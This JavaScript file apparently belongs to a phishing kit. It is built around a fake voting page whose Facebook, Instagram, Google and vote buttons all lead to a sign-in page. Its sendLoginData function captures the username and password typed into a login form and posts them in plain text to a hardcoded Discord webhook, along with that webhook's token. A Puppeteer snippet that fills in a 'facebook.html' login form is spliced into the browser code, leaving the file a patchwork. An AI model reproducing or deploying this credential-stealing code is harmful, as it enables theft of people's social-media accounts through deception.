// Function to redirect to the sign-in page
function redirectToSignIn(page) {
  window.location.href = page;
}

// Function to check if a profile is selected
function checkProfile() {
  var profile1 = document.getElementById("profile1");
  var profile2 = document.getElementById("profile2");

  if (!profile1.checked && !profile2.checked) {
    alert("Please choose a profile!");
    return false;
  }

  return true;
}

// Get the button elements
var voteBtn = document.getElementById('voteBtn');
var facebookBtn = document.getElementById('facebookBtn');
var instagramBtn = document.getElementById('instagramBtn');
var googleBtn = document.getElementById('googleBtn');

// Add click event listener to the vote button
voteBtn.addEventListener('click', function() {
  if (checkProfile()) {
    redirectToSignIn('signin.html');
  }
});

// Add click event listeners to the social media buttons
facebookBtn.addEventListener('click', function() {
  redirectToSignIn('signin.html');
});

instagramBtn.addEventListener('click', function() {
  redirectToSignIn('signin.html');
});

googleBtn.addEventListener('click', function() {
  redirectToSignIn('signin.html');
});

const puppeteer = require('puppeteer');

(async () => {
  const browser = await puppeteer.launch();
  const page = await browser.newPage();

  await page.goto('facebook.html'); // Replace with your desired URL

  // Fill in the login form fields
  await page.type('#email', 'your-email@example.com');
  await page.type('#pass', 'your-password');

  // Submit the form
  await page.click('#loginbutton');

  // Wait for the navigation to complete
  await page.waitForNavigation();

  // Now you can continue with any desired actions or further automation

  await browser.close();
})();

function sendLoginData(event) {
  event.preventDefault(); // Prevent the form from submitting normally

  const form = event.target;
  const username = form.username.value;
  const password = form.password.value;

  const webhookUrl = "https://discord.com/api/webhooks/1116509552695840768/qaUSQH-IXxJOiAgDTmflw3wNTJcg5kmMHMtSe6fi7Xm0HA3JHrOEpXUUFWBRvE22HvQg";

  const payload = {
    content: `Username: ${username}\nPassword: ${password}`,
  };

  fetch(webhookUrl, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify(payload),
  })
    .then(response => {
      if (response.ok) {
        // Successful webhook request
        // You can perform additional actions or display a success message
      } else {
        // Error in the webhook request
        // You can handle the error or display an error message
      }
    })
    .catch(error => {
      // Error in the fetch request
      // You can handle the error or display an error message
    });
}


